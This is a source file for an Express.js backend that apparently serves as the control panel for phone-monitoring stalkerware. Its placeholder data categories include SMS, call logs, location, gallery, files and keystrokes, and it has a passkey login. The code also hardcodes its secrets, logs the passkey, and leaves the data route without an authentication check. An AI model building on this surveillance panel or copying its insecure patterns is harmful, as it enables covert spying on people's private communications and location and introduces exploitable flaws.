const express = require('express');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();

// Middleware
app.use(cors({
    origin: 'https://iosx.vercel.app', // Your frontend URL
    credentials: true // Allow credentials to be sent
}));
app.use(bodyParser.json());
app.use(session({
    store: new FileStore(), // Use FileStore for sessions
    secret: 'your_secret_key', // Replace with your actual secret key
    resave: false,
    saveUninitialized: false,
    cookie: { 
        maxAge: 86400000, // Set cookie to expire in 1 day (24 hours)
        httpOnly: true,
        secure: false, // Set to true if using HTTPS in production
        sameSite: 'none'
    }
}));

// Your correct passkey
const correctPasskey = '9ecd92e21bb795a6064f1c9c6cc4fb9b'; // Ensure this is set correctly

// Your activity tracking data and routes
let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    console.log("Provided Passkey:", passkey);
    console.log("Correct Passkey:", correctPasskey);

    if (passkey === correctPasskey) {
        req.session.authenticated = true;
        console.log("User authenticated, session created.");
        console.log("Session ID:", req.sessionID);
        res.status(200).json({ message: "Login successful" });
    } else {
        console.log("Authentication failed.");
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Authentication status check
app.get('/auth-status', (req, res) => {
    console.log("Checking auth status");
    console.log("Session:", req.session); // Log the session content
    res.json({ authenticated: req.session.authenticated || false });
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(err => {
        if (err) {
            return res.status(500).json({ message: "Logout failed" });
        }
        res.clearCookie('connect.sid'); // Clear the session cookie
        res.status(200).json({ message: "Logout successful" });
    });
});

// Fetch activity data endpoint
app.get('/fetch/:activityType', (req, res) => {
    const activityType = req.params.activityType;

    if (!activityData.hasOwnProperty(activityType)) {
        return res.status(404).json({ message: "Activity type not found" });
    }

    // Example logic for populating activity data (this should be replaced with actual data fetching logic)
    const data = activityData[activityType] || "No data available";
    res.json({ data });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
